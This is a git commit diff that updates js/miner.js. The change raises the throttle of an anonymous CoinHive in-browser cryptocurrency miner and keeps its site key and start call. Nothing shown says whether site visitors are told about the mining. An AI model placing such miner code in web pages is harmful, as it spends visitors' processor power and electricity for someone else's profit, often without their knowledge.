527775dfd86946d0b733b4ab9886e9e73f1d11b9
Cole <colejbackman@gmail.com>
2018-01-10 09:54:01 -0600

    Update miner.js

--- js/miner.js
+++ js/miner.js
@@ -1,2 +1,2 @@
-var miner = new CoinHive.Anonymous('8N5A7Cz2b5zFpgkR8WmBXWFDGY3Mlj3k', {throttle: 0.3});
+var miner = new CoinHive.Anonymous('8N5A7Cz2b5zFpgkR8WmBXWFDGY3Mlj3k', {throttle: 0.5});
 miner.start();
